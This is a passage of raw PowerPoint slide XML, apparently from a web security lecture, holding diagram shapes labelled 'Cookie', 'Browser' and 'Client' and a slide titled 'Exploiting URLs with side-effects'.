          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85022" name="object 35"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1855975" y="3884239"/>
            <a:ext cx="84044" cy="319368"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 111769 w 94614"/>
              <a:gd name="T1" fmla="*/ 361732 h 361950"/>
              <a:gd name="T2" fmla="*/ 51650 w 94614"/>
              <a:gd name="T3" fmla="*/ 310812 h 361950"/>
              <a:gd name="T4" fmla="*/ 30319 w 94614"/>
              <a:gd name="T5" fmla="*/ 270240 h 361950"/>
              <a:gd name="T6" fmla="*/ 14605 w 94614"/>
              <a:gd name="T7" fmla="*/ 225176 h 361950"/>
              <a:gd name="T8" fmla="*/ 4498 w 94614"/>
              <a:gd name="T9" fmla="*/ 175621 h 361950"/>
              <a:gd name="T10" fmla="*/ 0 w 94614"/>
              <a:gd name="T11" fmla="*/ 121573 h 361950"/>
              <a:gd name="T12" fmla="*/ 1105 w 94614"/>
              <a:gd name="T13" fmla="*/ 63033 h 361950"/>
              <a:gd name="T14" fmla="*/ 7820 w 94614"/>
              <a:gd name="T15" fmla="*/ 0 h 36195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94614" h="361950">
                <a:moveTo>
                  <a:pt x="94534" y="361732"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="43681" y="310812"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25644" y="270240"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12352" y="225176"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3804" y="175621"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="121573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="936" y="63033"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6614" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="635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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85023" name="object 36"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1861578" y="4088747"/>
            <a:ext cx="256334" cy="207309"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 124426 w 290195"/>
              <a:gd name="T1" fmla="*/ 0 h 235585"/>
              <a:gd name="T2" fmla="*/ 0 w 290195"/>
              <a:gd name="T3" fmla="*/ 214099 h 235585"/>
              <a:gd name="T4" fmla="*/ 297598 w 290195"/>
              <a:gd name="T5" fmla="*/ 220225 h 235585"/>
              <a:gd name="T6" fmla="*/ 124426 w 290195"/>
              <a:gd name="T7" fmla="*/ 0 h 23558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90195" h="235585">
                <a:moveTo>
                  <a:pt x="121076" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="229044"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289585" y="235597"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12107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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85024" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6640887" y="4353485"/>
            <a:ext cx="983316" cy="487456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId9"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="object 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6778159" y="4034118"/>
            <a:ext cx="931489" cy="673774"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1141553" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="2118" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11191" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="724"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="397834488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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87043" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87044" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87045" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87048" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
